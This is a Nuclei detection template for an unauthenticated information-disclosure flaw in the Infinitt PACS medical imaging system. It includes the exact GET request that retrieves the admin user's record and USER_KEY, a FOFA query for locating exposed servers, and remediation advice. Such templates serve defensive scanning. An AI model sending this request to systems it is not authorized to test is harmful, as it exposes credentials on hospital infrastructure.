id: infinitt-pacs-info-disclosure

info:
  name: Infinitt PACS System - 信息泄露漏洞
  author: adeljck
  severity: high
  description: Infinitt PACS System - 信息泄露 存在信息泄露漏洞。未授权访问者可获取配置、凭证、用户数据或系统元信息，从而为后续攻击提供情报支持。
  remediation: |
    - 为敏感接口补充鉴权与最小化返回策略，避免未授权用户获取配置、账户或节点信息。
    - 审核日志、错误页和调试接口的输出内容，关闭不必要的调试或管理入口。
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="1474455751" || icon_hash="702238928"
  tags: infinitt,disclosure,exposure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<web_user_login>"
          - "<USER_KEY>"
        condition: and

      - type: word
        part: content_type
        words:
          - "text/xml"

      - type: status
        status:
          - 200
